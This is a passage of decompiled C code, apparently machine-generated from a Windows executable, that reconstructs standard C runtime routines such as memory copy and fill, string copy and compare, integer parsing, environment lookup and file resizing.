// Address range: 0x4061e8 - 0x406204
int32_t function_4061e8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4061e8
    int32_t result; // 0x4061e8
    if (g157 == 0) {
        int32_t v1 = function_405e10(-3); // 0x4061f3
        g157 = 1;
        result = v1;
    }
    // 0x406203
    return result;
}

// Address range: 0x406210 - 0x406545
int32_t function_406210(int32_t result5, uint32_t a2, uint32_t a3) {
    int32_t result3 = a3 + a2; // 0x406222
    int32_t v1; // 0x406210
    int32_t v2; // 0x406210
    int32_t v3; // 0x406210
    int32_t v4; // 0x406210
    int32_t v5; // 0x406210
    int32_t result6; // 0x406210
    int32_t v6; // 0x406210
    int32_t v7; // 0x406210
    int32_t v8; // 0x406210
    int32_t v9; // 0x406210
    int32_t v10; // 0x406210
    int32_t v11; // 0x406210
    int32_t result2; // 0x406210
    int32_t result; // 0x406210
    if (result5 > a2 == result3 > result5) {
        int32_t v12 = a3 - 4; // 0x4063a8
        int32_t v13 = v12 + a2; // 0x4063a8
        int32_t v14 = v12 + result5; // 0x4063ac
        int32_t v15 = v14 & 3; // 0x4063b0
        if (v15 != 0) {
            // 0x4063dc
            g172 = a3;
            result2 = v15;
            result = result5;
            v9 = v13;
            v6 = v14;
            v10 = v13;
            v7 = v14;
            v11 = v13;
            v8 = v14;
            switch (a3) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x406508;
                }
                case 2: {
                    goto lab_0x406518;
                }
                case 3: {
                    goto lab_0x40652c;
                }
                default: {
                    return result2;
                }
            }
        } else {
            int32_t v16 = -((a3 / 4));
            g171 = v16;
            if (a3 < 4) {
                // 0x406258
                return result3;
            }
            int32_t v17 = a3 & 3; // 0x4063bb
            __asm_rep_movsd_memcpy((char *)v14, (char *)v13, v16);
            int32_t v18 = v14 + (a3 & -4); // 0x4063c4
            g170 = v17;
            result = result5;
            v9 = v18;
            v6 = v18;
            v10 = v18;
            v7 = v18;
            v11 = v18;
            v8 = v18;
            switch (v17) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x406508;
                }
                case 2: {
                    goto lab_0x406518;
                }
                case 3: {
                    goto lab_0x40652c;
                }
                default: {
                    // 0x4063d02
                    // UNREACHABLE
                }
            }
        }
    } else {
        int32_t result4 = result5 & 3; // 0x406230
        if (result4 != 0) {
            // 0x40624c
            result = result5;
            if (a3 >= 4) {
                // 0x406258
                return result4;
            }
            // 0x406258
            return result;
        }
        int32_t v19 = a3 / 4; // 0x406238
        g169 = v19;
        result = result3;
        switch (v19) {
            case 0: {
                return result;
            }
            case 1: {
                // 0x406238
                result6 = a3 & -4;
                goto lab_0x40633c;
            }
            case 2: {
                // 0x406238
                v3 = a3 & -4;
                goto lab_0x406334;
            }
            case 3: {
                // 0x406238
                v4 = a3 & -4;
                goto lab_0x40632c;
            }
            case 4: {
                // 0x406238
                v5 = a3 & -4;
                goto lab_0x406324;
            }
            case 5: {
                // 0x406238
                v1 = a3 & -4;
                goto lab_0x40631c;
            }
            case 6: {
                // 0x406238
                v2 = a3 & -4;
                goto lab_0x406314;
            }
            case 7: {
                int32_t v20 = a3 & -4;
                int32_t v21 = v20 - 28;
                *(int32_t *)(v21 + result5) = *(int32_t *)(v21 + a2);
                v2 = v20;
                goto lab_0x406314;
            }
            default: {
                int32_t v22 = a3 & 3; // 0x40623b
                __asm_rep_movsd_memcpy((char *)result5, (char *)a2, v19);
                g168 = v22;
                result2 = result5;
                if (v22 < 2) {
                    // 0x406258
                    return result5;
                }
                // 0x406258
                return result2;
            }
        }
    }
  lab_0x406508:
    // 0x406508
    *(char *)(v6 + 3) = *(char *)(v9 + 3);
    return result5;
  lab_0x406518:
    // 0x406518
    *(char *)(v7 + 3) = *(char *)(v10 + 3);
    *(char *)(v7 + 2) = *(char *)(v10 + 2);
    return result5;
  lab_0x40652c:
    // 0x40652c
    *(char *)(v8 + 3) = *(char *)(v11 + 3);
    *(char *)(v8 + 2) = *(char *)(v11 + 2);
    *(char *)(v8 + 1) = *(char *)(v11 + 1);
    return result5;
  lab_0x40633c:;
    int32_t v23 = result6 - 4;
    *(int32_t *)(v23 + result5) = *(int32_t *)(v23 + a2);
    // 0x406258
    return result6;
  lab_0x406334:;
    int32_t v24 = v3 - 8;
    *(int32_t *)(v24 + result5) = *(int32_t *)(v24 + a2);
    result6 = v3;
    goto lab_0x40633c;
  lab_0x40632c:;
    int32_t v25 = v4 - 12;
    *(int32_t *)(v25 + result5) = *(int32_t *)(v25 + a2);
    v3 = v4;
    goto lab_0x406334;
  lab_0x406324:;
    int32_t v26 = v5 - 16;
    *(int32_t *)(v26 + result5) = *(int32_t *)(v26 + a2);
    v4 = v5;
    goto lab_0x40632c;
  lab_0x40631c:;
    int32_t v27 = v1 - 20;
    *(int32_t *)(v27 + result5) = *(int32_t *)(v27 + a2);
    v5 = v1;
    goto lab_0x406324;
  lab_0x406314:;
    int32_t v28 = v2 - 24;
    *(int32_t *)(v28 + result5) = *(int32_t *)(v28 + a2);
    v1 = v2;
    goto lab_0x40631c;
}

// Address range: 0x406545 - 0x4065ce
int32_t function_406545(int32_t * a1, char * a2, int32_t a3) {
    // 0x406545
    int32_t v1; // bp-12, 0x406545
    int32_t * v2 = &v1; // 0x406550
    if (g125 == 0) {
        int32_t * moduleHandle = LoadLibraryA("user32.dll"); // 0x406557
        if (moduleHandle == NULL) {
            // 0x4065c6
            return 0;
        }
        int32_t (*func)() = GetProcAddress(moduleHandle, "MessageBoxA"); // 0x40656f
        g125 = (int32_t)func;
        if (func == NULL) {
            // 0x4065c6
            return 0;
        }
        int32_t (*func2)() = GetProcAddress(moduleHandle, "GetActiveWindow"); // 0x406580
        int32_t v3 = (int32_t)moduleHandle; // bp-40, 0x406587
        g126 = (int32_t)func2;
        g127 = (int32_t)GetProcAddress(moduleHandle, "GetLastActivePopup");
        v2 = &v3;
    }
    int32_t v4 = (int32_t)v2;
    int32_t result = 0; // 0x40659b
    int32_t v5 = 0; // 0x40659b
    int32_t v6 = v4; // 0x40659b
    if (g126 != 0) {
        // 0x4065a5
        result = 0;
        v5 = g126;
        v6 = v4;
        if (g127 != 0) {
            int32_t v7 = v4 - 4; // 0x4065ae
            *(int32_t *)v7 = g126;
            result = g127;
            v5 = g127;
            v6 = v7;
        }
    }
    int32_t v8 = v6;
    *(int32_t *)(v8 - 4) = *(int32_t *)(v8 + 24);
    *(int32_t *)(v8 - 8) = *(int32_t *)(v8 + 20);
    *(int32_t *)(v8 - 12) = *(int32_t *)(v8 + 16);
    *(int32_t *)(v8 - 16) = v5;
    // 0x4065c6
    return result;
}

// Address range: 0x4065d0 - 0x4066ce
int32_t function_4065d0(int32_t result, char * a2, int32_t a3) {
    if (a3 == 0) {
        // 0x406622
        return result;
    }
    int32_t v1 = (int32_t)a2; // 0x4065dd
    int32_t v2 = a3; // 0x4065eb
    int32_t v3 = v1; // 0x4065eb
    int32_t v4 = result; // 0x4065eb
    int32_t v5; // 0x4065d0
    int32_t v6; // 0x4065d0
    int32_t v7; // 0x4065d0
    int32_t v8; // 0x4065d0
    int32_t v9; // 0x4065d0
    int32_t v10; // 0x4065d0
    int32_t v11; // 0x4065d0
    if ((v1 & 3) != 0) {
        char v12 = *(char *)v3; // 0x4065f4
        *(char *)v4 = v12;
        v2--;
        while (v2 != 0) {
            // 0x4065fd
            v4++;
            if (v12 == 0) {
                // 0x40662a
                v6 = v2;
                v9 = v4;
                v7 = v2;
                v10 = v4;
                if ((v4 & 3) == 0) {
                    goto lab_0x406644;
                } else {
                    goto lab_0x406632;
                }
            }
            // 0x406601
            v3++;
            if ((v3 & 3) == 0) {
                // 0x406609
                v5 = v2;
                v11 = v3;
                v8 = v4;
                if (v2 >= 4) {
                    goto lab_0x406661;
                } else {
                    goto lab_0x406610;
                }
            }
            v12 = *(char *)v3;
            *(char *)v4 = v12;
            v2--;
        }
      lab_0x406622:
        // 0x406622
        return result;
    }
    // 0x4065ed
    v2 = a3;
    v3 = v1;
    v4 = result;
    int32_t v13 = a3; // 0x4065f0
    v11 = v1;
    v8 = result;
    if (a3 >= 4) {
        goto lab_0x406661;
    } else {
        goto lab_0x406615;
    }
  lab_0x406661:;
    uint32_t v14 = *(int32_t *)v3;
    int32_t v15; // 0x4065d0
    if (((v14 ^ -0x7efeff00 ^ v14 + 0x7efefeff) & -0x7efeff00) != 0) {
        if ((char)v14 == 0) {
            // 0x4066ab
            *(int32_t *)v15 = 0;
            goto lab_0x4066af;
        }
        if ((v14 & 0xff00) == 0) {
            // 0x4066a1
            *(int32_t *)v15 = v14 & 255;
            goto lab_0x4066af;
        }
        if ((v14 & 0xff0000) == 0) {
            // 0x406697
            *(int32_t *)v15 = v14 & 0xffff;
            goto lab_0x4066af;
        }
        if (v14 < 0x1000000) {
            // 0x406693
            *(int32_t *)v15 = v14;
            goto lab_0x4066af;
        }
    }
    int32_t v16 = v3 + 4; // 0x406671
    *(int32_t *)v4 = v14;
    int32_t v17 = v4 + 4; // 0x40665b
    int32_t v18 = v2 / 4 - 1; // 0x40665e
    v5 = v2;
    v11 = v16;
    v8 = v17;
    int32_t v19 = v18; // 0x40665f
    int32_t v20 = v16; // 0x40665f
    int32_t v21 = v17; // 0x40665f
    while (v18 != 0) {
        // 0x406661
        v14 = *(int32_t *)v20;
        if (((v14 ^ -0x7efeff00 ^ v14 + 0x7efefeff) & -0x7efeff00) != 0) {
            if ((char)v14 == 0) {
                // 0x4066ab
                *(int32_t *)v15 = 0;
                goto lab_0x4066af;
            }
            if ((v14 & 0xff00) == 0) {
                // 0x4066a1
                *(int32_t *)v15 = v14 & 255;
                goto lab_0x4066af;
            }
            if ((v14 & 0xff0000) == 0) {
                // 0x406697
                *(int32_t *)v15 = v14 & 0xffff;
                goto lab_0x4066af;
            }
            if (v14 < 0x1000000) {
                // 0x406693
                *(int32_t *)v15 = v14;
                goto lab_0x4066af;
            }
        }
        // 0x406659
        v16 = v20 + 4;
        *(int32_t *)v21 = v14;
        v17 = v21 + 4;
        v18 = v19 - 1;
        v5 = v2;
        v11 = v16;
        v8 = v17;
        v19 = v18;
        v20 = v16;
        v21 = v17;
    }
    goto lab_0x406610;
  lab_0x406615:;
    int32_t v22 = v11;
    int32_t v23 = v13;
    char v24 = *(char *)v22; // 0x406615
    *(char *)v8 = v24;
    int32_t v25 = v8 + 1; // 0x40661a
    int32_t v26 = v23; // 0x40661d
    int32_t v27 = v25; // 0x40661d
    while (v24 != 0) {
        int32_t v28 = v23 - 1; // 0x40661f
        if (v28 == 0) {
            // 0x406622
            return result;
        }
        v22++;
        v23 = v28;
        v24 = *(char *)v22;
        *(char *)v25 = v24;
        v25++;
        v26 = v23;
        v27 = v25;
    }
    goto lab_0x40664e;
  lab_0x406610:
    // 0x406610
    v13 = v5 & 3;
    if (v13 == 0) {
        // 0x406622
        return result;
    }
    goto lab_0x406615;
  lab_0x40664e:;
    int32_t v29 = v26 - 1; // 0x40664e
    int32_t v30 = v29; // 0x40664f
    int32_t v31 = v27; // 0x40664f
    if (v29 == 0) {
        // 0x406622
        return result;
    }
    goto lab_0x40664b;
  lab_0x40664b:
    // 0x40664b
    *(char *)v31 = 0;
    v26 = v30;
    v27 = v31 + 1;
    goto lab_0x40664e;
  lab_0x406644:
    // 0x406644
    v30 = v7;
    v31 = v10;
    if (v7 >= 4) {
        goto lab_0x4066b7;
    } else {
        goto lab_0x40664b;
    }
  lab_0x406632:
    // 0x406632
    *(char *)v9 = 0;
    int32_t v32 = v6 - 1; // 0x406635
    if (v32 == 0) {
        goto lab_0x406622;
    } else {
        int32_t v33 = v9 + 1; // 0x406634
        v6 = v32;
        v9 = v33;
        v7 = v32;
        v10 = v33;
        if ((v33 & 3) != 0) {
            goto lab_0x406632;
        } else {
            goto lab_0x406644;
        }
    }
  lab_0x4066b7:;
    int32_t v34 = v7 / 4; // 0x4066b7
    int32_t v35 = v10; // 0x4066b7
    goto lab_0x4066b9;
  lab_0x4066b9:
    // 0x4066b9
    *(int32_t *)v35 = 0;
    int32_t v36 = v35 + 4; // 0x4066bb
    int32_t v37 = v34 - 1; // 0x4066be
    v34 = v37;
    v35 = v36;
    int32_t v38 = v36; // 0x4066bf
    if (v37 != 0) {
        goto lab_0x4066b9;
    } else {
        goto lab_0x4066c1;
    }
  lab_0x4066c1:;
    int32_t v39 = v7 & 3; // 0x4066c1
    v30 = v39;
    v31 = v38;
    if (v39 != 0) {
        goto lab_0x40664b;
    } else {
        goto lab_0x406622;
    }
  lab_0x4066af:
    // 0x4066af
    v38 = v15 + 4;
    int32_t v40; // 0x4065d0
    if (v40 == 1) {
        goto lab_0x4066c1;
    } else {
        goto lab_0x4066b7;
    }
}

// Address range: 0x4066d0 - 0x406728
int32_t function_4066d0(int32_t result, int32_t a2, int32_t a3) {
    // 0x4066d0
    if (a3 == 0) {
        // 0x40671d
        return result;
    }
    int32_t v1 = a2 & 255;
    int32_t v2 = v1; // 0x4066e8
    int32_t v3 = a3; // 0x4066e8
    int32_t v4 = result; // 0x4066e8
    if (a3 >= 4) {
        int32_t v5 = -result & 3; // 0x4066ec
        int32_t v6 = a3; // 0x4066ef
        int32_t v7 = result; // 0x4066ef
        if (v5 != 0) {
            int32_t v8 = v5; // 0x4066f1
            *(char *)result = (char)a2;
            int32_t v9 = result + 1; // 0x4066f5
            v8--;
            int32_t v10 = v9; // 0x4066f7
            while (v8 != 0) {
                // 0x4066f3
                *(char *)v10 = (char)a2;
                v9 = v10 + 1;
                v8--;
                v10 = v9;
            }
            // 0x4066f9
            v6 = a3 - v5;
            v7 = v9;
        }
        int32_t v11 = 0x1010101 * v1; // 0x406705
        int32_t v12 = v6 & 3; // 0x406709
        v2 = v11;
        v3 = v12;
        v4 = v7;
        if (v6 >= 4) {
            uint32_t v13 = v6 / 4; // 0x40670c
            __asm_rep_stosd_memset((char *)v7, v11, v13);
            v2 = v11;
            v3 = v12;
            bool v14; // 0x4066d0
            v4 = v13 * (v14 ? -4 : 4) + v7;
            if (v12 == 0) {
                // 0x40671d
                return result;
            }
        }
    }
    int32_t v15 = v3; // 0x40671a
    int32_t v16 = v4; // 0x4066d0
    *(char *)v16 = (char)v2;
    v15--;
    v16++;
    while (v15 != 0) {
        // 0x406717
        *(char *)v16 = (char)v2;
        v15--;
        v16++;
    }
    // 0x40671d
    return result;
}

// Address range: 0x406728 - 0x406743
int32_t __callnewh(int32_t a1) {
    // 0x406728
    return g128 != 0;
}

// Address range: 0x406743 - 0x40674c
int32_t function_406743(void) {
    // 0x406743
    return __amsg_exit();
}

// Address range: 0x406750 - 0x406a85
int32_t function_406750(int32_t result5, uint32_t a2, uint32_t a3) {
    int32_t result3 = a3 + a2; // 0x406762
    int32_t v1; // 0x406750
    int32_t v2; // 0x406750
    int32_t v3; // 0x406750
    int32_t v4; // 0x406750
    int32_t v5; // 0x406750
    int32_t result6; // 0x406750
    int32_t v6; // 0x406750
    int32_t v7; // 0x406750
    int32_t v8; // 0x406750
    int32_t v9; // 0x406750
    int32_t v10; // 0x406750
    int32_t v11; // 0x406750
    int32_t result2; // 0x406750
    int32_t result; // 0x406750
    if (result5 > a2 == result3 > result5) {
        int32_t v12 = a3 - 4; // 0x4068e8
        int32_t v13 = v12 + a2; // 0x4068e8
        int32_t v14 = v12 + result5; // 0x4068ec
        int32_t v15 = v14 & 3; // 0x4068f0
        if (v15 != 0) {
            // 0x40691c
            g166 = a3;
            result2 = v15;
            result = result5;
            v9 = v13;
            v6 = v14;
            v10 = v13;
            v7 = v14;
            v11 = v13;
            v8 = v14;
            switch (a3) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x406a48;
                }
                case 2: {
                    goto lab_0x406a58;
                }
                case 3: {
                    goto lab_0x406a6c;
                }
                default: {
                    return result2;
                }
            }
        } else {
            int32_t v16 = -((a3 / 4));
            g165 = v16;
            if (a3 < 4) {
                // 0x406798
                return result3;
            }
            int32_t v17 = a3 & 3; // 0x4068fb
            __asm_rep_movsd_memcpy((char *)v14, (char *)v13, v16);
            int32_t v18 = v14 + (a3 & -4); // 0x406904
            g175 = v17;
            result = result5;
            v9 = v18;
            v6 = v18;
            v10 = v18;
            v7 = v18;
            v11 = v18;
            v8 = v18;
            switch (v17) {
                case 0: {
                    return result;
                }
                case 1: {
                    goto lab_0x406a48;
                }
                case 2: {
                    goto lab_0x406a58;
                }
                case 3: {
                    goto lab_0x406a6c;
                }
                default: {
                    // 0x4069102
                    // UNREACHABLE
                }
            }
        }
    } else {
        int32_t result4 = result5 & 3; // 0x406770
        if (result4 != 0) {
            // 0x40678c
            result = result5;
            if (a3 >= 4) {
                // 0x406798
                return result4;
            }
            // 0x406798
            return result;
        }
        int32_t v19 = a3 / 4; // 0x406778
        g174 = v19;
        result = result3;
        switch (v19) {
            case 0: {
                return result;
            }
            case 1: {
                // 0x406778
                result6 = a3 & -4;
                goto lab_0x40687c;
            }
            case 2: {
                // 0x406778
                v3 = a3 & -4;
                goto lab_0x406874;
            }
            case 3: {
                // 0x406778
                v4 = a3 & -4;
                goto lab_0x40686c;
            }
            case 4: {
                // 0x406778
                v5 = a3 & -4;
                goto lab_0x406864;
            }
            case 5: {
                // 0x406778
                v1 = a3 & -4;
                goto lab_0x40685c;
            }
            case 6: {
                // 0x406778
                v2 = a3 & -4;
                goto lab_0x406854;
            }
            case 7: {
                int32_t v20 = a3 & -4;
                int32_t v21 = v20 - 28;
                *(int32_t *)(v21 + result5) = *(int32_t *)(v21 + a2);
                v2 = v20;
                goto lab_0x406854;
            }
            default: {
                int32_t v22 = a3 & 3; // 0x40677b
                __asm_rep_movsd_memcpy((char *)result5, (char *)a2, v19);
                g173 = v22;
                result2 = result5;
                if (v22 < 2) {
                    // 0x406798
                    return result5;
                }
                // 0x406798
                return result2;
            }
        }
    }
  lab_0x406a48:
    // 0x406a48
    *(char *)(v6 + 3) = *(char *)(v9 + 3);
    return result5;
  lab_0x406a58:
    // 0x406a58
    *(char *)(v7 + 3) = *(char *)(v10 + 3);
    *(char *)(v7 + 2) = *(char *)(v10 + 2);
    return result5;
  lab_0x406a6c:
    // 0x406a6c
    *(char *)(v8 + 3) = *(char *)(v11 + 3);
    *(char *)(v8 + 2) = *(char *)(v11 + 2);
    *(char *)(v8 + 1) = *(char *)(v11 + 1);
    return result5;
  lab_0x40687c:;
    int32_t v23 = result6 - 4;
    *(int32_t *)(v23 + result5) = *(int32_t *)(v23 + a2);
    // 0x406798
    return result6;
  lab_0x406874:;
    int32_t v24 = v3 - 8;
    *(int32_t *)(v24 + result5) = *(int32_t *)(v24 + a2);
    result6 = v3;
    goto lab_0x40687c;
  lab_0x40686c:;
    int32_t v25 = v4 - 12;
    *(int32_t *)(v25 + result5) = *(int32_t *)(v25 + a2);
    v3 = v4;
    goto lab_0x406874;
  lab_0x406864:;
    int32_t v26 = v5 - 16;
    *(int32_t *)(v26 + result5) = *(int32_t *)(v26 + a2);
    v4 = v5;
    goto lab_0x40686c;
  lab_0x40685c:;
    int32_t v27 = v1 - 20;
    *(int32_t *)(v27 + result5) = *(int32_t *)(v27 + a2);
    v5 = v1;
    goto lab_0x406864;
  lab_0x406854:;
    int32_t v28 = v2 - 24;
    *(int32_t *)(v28 + result5) = *(int32_t *)(v28 + a2);
    v1 = v2;
    goto lab_0x40685c;
}

// Address range: 0x406a85 - 0x406baa
int32_t function_406a85(int32_t a1, int32_t a2) {
    // 0x406a85
    int32_t v1; // 0x406a85
    function_401900(v1);
    int32_t v2 = 1; // bp-16, 0x406a96
    int32_t v3 = 0; // bp-20, 0x406a98
    int32_t v4 = function_4056e3(a1, 0, 1); // 0x406a9c
    if (v4 == -1) {
        // 0x406ba6
        return -1;
    }
    // 0x406ab2
    v2 = 2;
    v3 = 0;
    int32_t v5 = function_4056e3(a1, 0, 2); // 0x406ab8
    if (v5 == -1) {
        // 0x406ba6
        return -1;
    }
    int32_t v6 = &v2; // 0x406ac8
    int32_t v7 = a2 - v5; // 0x406acc
    int32_t result; // 0x406a85
    int32_t v8; // 0x406a85
    if (v7 < 1) {
        // 0x406b47
        v8 = v6;
        result = 0;
        if (v7 != 0) {
            // 0x406b49
            function_4056e3(a1, a2, 0);
            int32_t hFile = function_404de7(a1); // 0x406b59
            v3 = hFile;
            int32_t v9 = &v3; // 0x406b61
            bool v10 = SetEndOfFile((int32_t *)hFile); // 0x406b62
            int32_t v11 = !v10; // 0x406b70
            v8 = v9;
            result = v11;
            if (!v10) {
                // 0x406b75
                *(int32_t *)function_404bb7() = 13;
                int32_t errorCode = GetLastError(); // 0x406b80
                *(int32_t *)function_404bc0() = errorCode;
                v8 = v9;
                result = v11;
            }
        }
    } else {
        // 0x406ad2
        v3 = 0x1000;
        int32_t v12; // bp-4104, 0x406a85
        int32_t v13 = &v12; // 0x406adf
        function_4066d0(v13, 0, 0x1000);
        int32_t v14 = function_40719a(a1, 0x8000); // 0x406aed
        int32_t * v15 = (int32_t *)(v6 - 4);
        int32_t * v16 = (int32_t *)(v6 - 8);
        int32_t v17 = v7;
        *v15 = v17 < 0x1000 ? v17 : 0x1000;
        *v16 = v13;
        *(int32_t *)(v6 - 12) = a1;
        int32_t v18 = function_404fa2((int32_t)&g167, (int32_t)&g167, (int32_t)&g167); // 0x406b0b
        int32_t v19; // 0x406a85
        while (v18 != -1) {
            int32_t v20 = v17 - v18; // 0x406b18
            v19 = 0;
            if (v20 < 1) {
                goto lab_0x406b38;
            }
            v17 = v20;
            *v15 = v17 < 0x1000 ? v17 : 0x1000;
            *v16 = v13;
            *(int32_t *)(v6 - 12) = a1;
            v18 = function_404fa2((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        }
        int32_t v21 = *(int32_t *)function_404bc0(); // 0x406b25
        v19 = -1;
        if (v21 == 5) {
            // 0x406b2a
            *(int32_t *)function_404bb7() = 13;
            v19 = -1;
        }
      lab_0x406b38:
        // 0x406b38
        *v15 = v14;
        *v16 = a1;
        function_40719a((int32_t)&g167, (int32_t)&g167);
        v8 = v6;
        result = v19;
    }
    // 0x406b8f
    *(int32_t *)(v8 - 4) = 0;
    *(int32_t *)(v8 - 8) = v4;
    *(int32_t *)(v8 - 12) = a1;
    function_4056e3((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
    // 0x406ba6
    return result;
}

// Address range: 0x406baa - 0x406c35
int32_t function_406baa(int32_t a1) {
    // 0x406baa
    int32_t v1; // bp-16, 0x406baa
    int32_t v2 = &v1; // 0x406bad
    int32_t * v3 = (int32_t *)(v2 - 4);
    int32_t * v4 = (int32_t *)(v2 - 8);
    int32_t v5 = a1;
    char * v6 = (char *)v5;
    int32_t v7 = (int32_t)*v6;
    int32_t v8; // 0x406baa
    int32_t v9; // 0x406bc1
    if (g62 < 2) {
        // 0x406bca
        v8 = (int32_t)(*(char *)(g35 + 2 * v7) & 8);
    } else {
        // 0x406bbb
        *v3 = 8;
        *v4 = v7;
        v9 = function_4071fb((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        v8 = v9;
    }
    int32_t v10 = v5 + 1;
    while (v8 != 0) {
        // 0x406bb2
        v5 = v10;
        v6 = (char *)v5;
        v7 = (int32_t)*v6;
        if (g62 < 2) {
            // 0x406bca
            v8 = (int32_t)(*(char *)(g35 + 2 * v7) & 8);
        } else {
            // 0x406bbb
            *v3 = 8;
            *v4 = v7;
            v9 = function_4071fb((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
            v8 = v9;
        }
        // 0x406bd9
        v10 = v5 + 1;
    }
    char v11 = *v6; // 0x406be0
    char v12 = v11; // 0x406be9
    int32_t v13 = v10; // 0x406be9
    if (v11 != 45 != v11 != 43) {
        // 0x406bf0
        v12 = *(char *)v10;
        v13 = v5 + 2;
    }
    int32_t v14 = v13; // 0x406bf4
    int32_t v15 = 0;
    int32_t v16 = v12;
    int32_t v17; // 0x406baa
    int32_t v18; // 0x406c02
    if (g62 < 2) {
        // 0x406c0b
        v17 = (int32_t)(*(char *)(g35 + 2 * v16) & 4);
    } else {
        // 0x406bff
        *v3 = 4;
        *v4 = v16;
        v18 = function_4071fb((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
        v17 = v18;
    }
    while (v17 != 0) {
        char v19 = *(char *)v14; // 0x406c21
        v14++;
        v15 = 10 * v15 - 48 + v16;
        v16 = v19;
        if (g62 < 2) {
            // 0x406c0b
            v17 = (int32_t)(*(char *)(g35 + 2 * v16) & 4);
        } else {
            // 0x406bff
            *v3 = 4;
            *v4 = v16;
            v18 = function_4071fb((int32_t)&g167, (int32_t)&g167, (int32_t)&g167);
            v17 = v18;
        }
    }
    // 0x406c27
    return v11 != 45 ? v15 : -v15;
}

// Address range: 0x406c40 - 0x406cc4
int32_t function_406c40(int32_t a1, int32_t a2) {
    int32_t v1 = a2; // 0x406c4e
    int32_t v2 = a1; // 0x406c4e
    int32_t v3; // 0x406c96
    int32_t v4; // 0x406c9b
    if ((a1 & 3) != 0) {
        // 0x406c8c
        v4 = a2;
        v3 = a1;
        if ((a1 & 1) == 0) {
            goto lab_0x406ca8;
        } else {
            unsigned char v5 = *(char *)a1; // 0x406c94
            unsigned char v6 = *(char *)a2; // 0x406c97
            if (v5 != v6) {
                // 0x406c84
                return 2 * (int32_t)(v5 < v6) | 1;
            }
            if (v5 == 0) {
                // 0x406c80
                return 0;
            }
            // 0x406ca0
            v3 = a1 + 1;
            v4 = a2 + 1;
            v1 = v4;
            v2 = v3;
            if ((v3 & 2) == 0) {
                goto lab_0x406c50;
            } else {
                goto lab_0x406ca8;
            }
        }
    } else {
        goto lab_0x406c50;
    }
  lab_0x406c50:;
    int32_t v7 = v1; // 0x406c40
    int32_t v8 = v2; // 0x406c40
    uint32_t v9 = *(int32_t *)v8; // 0x406c50
    unsigned char v10 = (char)v9;
    unsigned char v11 = *(char *)v7; // 0x406c52
    bool v12; // 0x406c40
    while (v11 == v10) {
        if (v10 == 0) {
            // 0x406c80
            return 0;
        }
        unsigned char v13 = (char)(v9 / 256);
        unsigned char v14 = *(char *)(v7 + 1); // 0x406c5a
        if (v14 != v13) {
            // 0x406c84
            v12 = v14 > v13;
            return 2 * (int32_t)v12 | 1;
        }
        if ((v9 & 0xff00) == 0) {
            // 0x406c80
            return 0;
        }
        unsigned char v15 = (char)(v9 / 0x10000);
        unsigned char v16 = *(char *)(v7 + 2); // 0x406c66
        if (v16 != v15) {
            // 0x406c84
            v12 = v16 > v15;
            return 2 * (int32_t)v12 | 1;
        }
        if (v15 == 0) {
            // 0x406c80
            return 0;
        }
        unsigned char v17 = (char)(v9 / 0x1000000);
        unsigned char v18 = *(char *)(v7 + 3); // 0x406c6f
        if (v18 != v17) {
            // 0x406c84
            v12 = v18 > v17;
            return 2 * (int32_t)v12 | 1;
        }
        // 0x406c74
        v7 += 4;
        v8 += 4;
        if (v9 < 0x1000000) {
            // 0x406c80
            return 0;
        }
        v9 = *(int32_t *)v8;
        v10 = (char)v9;
        v11 = *(char *)v7;
    }
    // 0x406c84
    return 2 * (int32_t)(v11 > v10) | 1;
  lab_0x406ca8:;
    uint16_t v19 = *(int16_t *)v3; // 0x406ca8
    unsigned char v20 = (char)v19; // 0x406cae
    unsigned char v21 = *(char *)v4; // 0x406cae
    if (v21 != v20) {
        // 0x406c84
        return 2 * (int32_t)(v21 > v20) | 1;
    }
    if (v20 == 0) {
        // 0x406c80
        return 0;
    }
    unsigned char v22 = (char)(v19 / 256); // 0x406cb6
    unsigned char v23 = *(char *)(v4 + 1); // 0x406cb6
    v12 = v23 > v22;
    if (v23 != v22) {
      lab_0x406c84_4:
        // 0x406c84
        return 2 * (int32_t)v12 | 1;
    }
    if (v19 < 256) {
        // 0x406c80
        return 0;
    }
    // 0x406cbf
    v1 = v4 + 2;
    v2 = v3 + 2;
    goto lab_0x406c50;
}

// Address range: 0x406cc4 - 0x406d41
int32_t function_406cc4(char * a1) {
    // 0x406cc4
    if (g156 == 0) {
        // 0x406d3d
        return 0;
    }
    int32_t v1 = g86; // 0x406cd8
    if (g86 == 0) {
        // 0x406cda
        if (g88 == g86 || function_4072e3() != 0) {
            // 0x406d3d
            return 0;
        }
        // 0x406ceb
        v1 = g86;
        if (v1 == 0) {
            // 0x406d3d
            return 0;
        }
    }
    // 0x406cf5
    if (a1 == NULL) {
        // 0x406d3d
        return 0;
    }
    int32_t v2 = (int32_t)a1; // 0x406cf5
    uint32_t v3 = function_403de0(v2); // 0x406cfe
    int32_t * v4 = (int32_t *)v1; // 0x406d06
    int32_t v5 = *v4; // 0x406d06
    if (v5 == 0) {
        // 0x406d3d
        return 0;
    }
    // 0x406d0c
    int32_t v6; // bp-12, 0x406cc4
    int32_t v7 = &v6; // 0x406cd3
    int32_t * v8 = (int32_t *)(v7 - 4); // 0x406d0c
    int32_t v9 = v1; // 0x406d2e
    *v8 = v5;
    int32_t result; // 0x406cc4
    int32_t v10; // 0x406d17
    if (function_403de0((int32_t)&g167) > v3) {
        // 0x406d17
        v10 = *v4;
        if (*(char *)(v10 + v3) == 61) {
            // 0x406d1f
            *v8 = v3;
            *(int32_t *)(v7 - 8) = v2;
            *(int32_t *)(v7 - 12) = v10;
            if (__mbsnbicoll() == 0) {
                // 0x406d33
                result = v3 + 1 + *v4;
                return result;
            }
        }
    }
    // 0x406d2e
    v9 += 4;
    int32_t * v11 = (int32_t *)v9; // 0x406d06
    int32_t v12 = *v11; // 0x406d06
    result = 0;
    while (v12 != 0) {
        int32_t * v13 = v11;
        *v8 = v12;
        if (function_403de0((int32_t)&g167) > v3) {
            // 0x406d17
            v10 = *v13;
            if (*(char *)(v10 + v3) == 61) {
                // 0x406d1f
                *v8 = v3;
                *(int32_t *)(v7 - 8) = v2;
                *(int32_t *)(v7 - 12) = v10;
                if (__mbsnbicoll() == 0) {
                    // 0x406d33
